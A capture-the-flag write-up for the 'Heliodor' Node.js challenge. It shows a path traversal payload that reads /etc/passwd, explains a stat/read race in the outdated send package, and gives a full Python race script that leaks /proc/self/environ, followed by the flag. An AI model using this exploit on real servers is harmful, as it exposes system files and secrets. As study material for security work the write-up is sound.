## Heliodor  

<img src="images/chall.png" width=600>

We are given a Node.js server that allows us to view and upload files.  

The Dockerfile shows that the flag is stored as an environment variable.  

```dockerfile
# FROM node:16-alpine
FROM node@sha256:1908564153449b1c46b329e6ce2307e226bc566294f822f11c5a8bcef4eeaad7

ENV USER heliodor
ENV PORT 58283
ENV NODE_ENV production
ENV FLAG GoN{sample_flag}

# Change tmp permissions
RUN chmod 1733 /tmp /var/tmp /dev/shm

# Add user
RUN adduser -D -g "" $USER

# Add files
COPY --chown=root:root heliodor /heliodor

WORKDIR /heliodor
RUN npm install

# Add initial empty jsonfs
USER $USER
RUN mkdir /tmp/jsonfs

CMD ["npm", "start"]
EXPOSE $PORT
```

The `/query/view` endpoint allows us to specify `expr`, which it will download and return from the container.  

```js
/* GET single value. */
router.get('/view/:expr', checkExprOne, function(req, res, next) {
  return res.download(req.exprPath, function(err) {
    if (err && !res.headersSent) {
      err.status = 500;
      return next(err);
    }
  });
});
```

The `checkExprOne()` validation on `expr` requires at least one dot-prefixed segment, while `jq2path()` splits `expr` by `.` and resolves it into `/tmp/jsonfs`.  

These combined have a path traversal vuln, as we can supply an arbitrary number of dot segments, which will cause `jq2path` to resolve `expr` to an absolute path. `path.resolve()` will then completely omit `/tmp/jsonfs`, giving us an arbitrary file read primitive.  

```js
/* Resolve jq expression into an absolute path. */
function jq2path(expr) {
  return path.resolve('/tmp/jsonfs/', expr.split('.').slice(1).join('/'));
}

/* Check single jq expression and save it to req.exprPath. */
function checkExprOne(req, res, next) {
  const expr = req.params.expr;
  if (
    typeof expr !== 'string' ||
    !/^(\.[0-9A-Za-z_-]*)+$/.test(expr)
  ) {
    const err = new Error("Invalid JSON query expression.");
    err.status = 400;
    return next(err);
  } else {
    req.exprPath = jq2path(expr);
    return next();
  }
}
```

Visiting the endpoint below will download `/etc/passwd`, confirming the arbitrary file read primitive.  

```
/query/view/..etc.passwd
```

Unfortunately, leaking the flag isn't as simple as reading `/proc/self/environ` using the primitive above.  

`res.download()` uses `fs.stat()` to determmine the filesize, which will then be set as the `Content-Length` for `fs.createReadStream()`, which is used to read the file contents.  

However, since `/proc/self/environ` is a virtual file, the kernel generates its content on read rather than storing bytes on the disk, meaning `fs.stat()` will always return `0`, resulting in no content being read from `/proc/self/environ`.  

Looking at `npm-shrinkwrap.json`, we will realise that the server uses an outdated version of the `send` package, which `res.download()` uses to read and download files.  

```json
"send": "0.16.2",
```

If we search through the Github repository for `send`, we will find [this pull request](https://github.com/pillarjs/send/pull/125), which details a potential race condition between `fs.stat()` and `fs.createReadStream()`.  

<img src="images/pr.png" width=800>

`/update/patch` allows us to supply a JSON object, which it will resolve and write files into `/tmp/jsonfs`.  

In theory, we should be able to create a dummy file `/tmp/jsonfs/self/environ` which `fs.stat()` will initially run on, then race a shared file descriptor between `/proc/self` and `/tmp/jsonfs`.  

By continuously opening and closing these two on the same reused fd number while separately requesting `/proc/self/fd/N/self/environ`. If we get lucky, the kernel will resolve the full path as `/proc/self/environ` while the response carries the `Content-Length` borrowed from the earlier stat of `/tmp/jsonfs/self/environ`, allowing us to read the environment variables.   

```js
/* POST JSON value into filesystem. */
router.post('/patch', sanitizeBody, function(req, res, next) {
  function commitDeltas(err) {
    if (err) {
      err.status = 500;
      return next(err);
    } else if (req.deltas.length === 0) {
      return res.json({success: true});
    } else {
      const delta = req.deltas.pop();
      if (delta.type === 'file') {
        return fs.writeFile(delta.dir, delta.data, commitDeltas);
      } else {  // delta.type === 'dir'
        return fs.mkdir(delta.dir, function(err) {
          return commitDeltas(err?.code === 'EEXIST' ? null : err);
        });
      }
    }
  }
  commitDeltas(null);
});
```

Below is my full solve script for this challenge.  

We use `spray_worker()` to repeatedly request `/query/list/.,..proc`, causing the server to call `fs.readdir()` on `/tmp/jsonfs` and then on `/proc` within the same request, reusing the same fd number each time. In parallel, `reader_worker()` continuously leaks `/proc/self/fd/{fd}/self/environ` and if we're lucky, one of the requests will race the fd flip successfully.  

Some optimisations we can add to increase the success of a leak are filling `/tmp/jsonfs` with junk files to slow down `fs.readdir()`, and also add junk headers to our read requests such that `fs.stat()` is further delayed.  

An important thing to note is that the initial `leak("/etc/passwd")` call is essential to the solve, as it fixes the `/proc/self/environ` fd to `19` for some reason. I'm not sure why, but apparently `requests.Session()` keeps HTTP connections alive by default, so it leaves one TCP connection permanently open for the rest of the script's life and permanently reserves one low file fd number for `/proc/self/environ`.  

```python
import re
import threading
import requests

url = 'http://host3.dreamhack.games:11157/'
s = requests.Session()

# was supposed to be some test code but script breaks without it lol
def leak(path):
    parts = [p for p in path.split('/') if p != '']

    res = s.get(f"{url.rstrip('/')}/query/view/..{'.'.join(parts)}")

    if res.status_code == 200:
        return res.text

    return f'Error: {res.text}'

# dont remove this, fixes environ fd onto 19 for some reason
print(leak('/etc/passwd'))

def init_jsonfs():
    sess = requests.Session()
    
    res = sess.post(f'{url}/update/reset')
    assert res.json()['success']

    res = sess.post(f'{url}/update/patch', json=[""] * 7000)
    assert res.json()['success']

    # race cond swaps /proc/self/environ with this dummy file
    sess.post(
        f'{url}/update/patch',
        json={'self': {'environ': 'A' * 1251}},
    )

NUM_SPRAY_THREADS = 8
NUM_READER_THREADS = 4
ROUNDS_PER_THREAD = 0x400

env_leak = None
stop_event = threading.Event()

def spray_worker():
    sess = requests.Session()
    spray_url = f"{url.rstrip('/')}/query/list/.,..proc"
    while not stop_event.is_set():
        try:
            sess.get(spray_url)
        except requests.RequestException:
            pass

def reader_worker(fd):
    global env_leak
    sess = requests.Session()
    read_url = f"{url.rstrip('/')}/query/view/..proc.self.fd.{fd}.self.environ"

    # add junk headers to slow down res.send()
    range_hdr = 'bytes=0-10000,' + ','.join(['9-0', '0-1', '1-9', 'a-a'] * 60)
    headers = {'Range': range_hdr, 'if-range': '"'}

    for _ in range(ROUNDS_PER_THREAD):
        if stop_event.is_set():
            return
        try:
            res = sess.get(read_url, headers=headers)
            print("Leak:", res.text)
        except Exception as e:
            print("Error:", e)
            continue

        if 'flag' in res.text.lower():
            env_leak = res.text
            
            stop_event.set()
            return

def race_environ(fd_candidates):
    stop_event.clear()

    threads = []
    for _ in range(NUM_SPRAY_THREADS):
        t = threading.Thread(target=spray_worker, daemon=True)
        threads.append(t)

    for fd in fd_candidates:
        for _ in range(NUM_READER_THREADS):
            t = threading.Thread(target=reader_worker, args=(fd,), daemon=True)
            threads.append(t)

    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=60)

    stop_event.set()

print('> Filling /tmp/jsonfs with junk')
init_jsonfs()

print('> Racing /proc/self/environ')
race_environ(fd_candidates=(19,))

flag = re.findall(r'(GoN{.+?})', env_leak)[0].strip()
print("Flag:", flag)
```

Flag: `GoN{fol10w_7he_tr4il5_of_h3li0d0r_shin1n9_up0n_procfs}`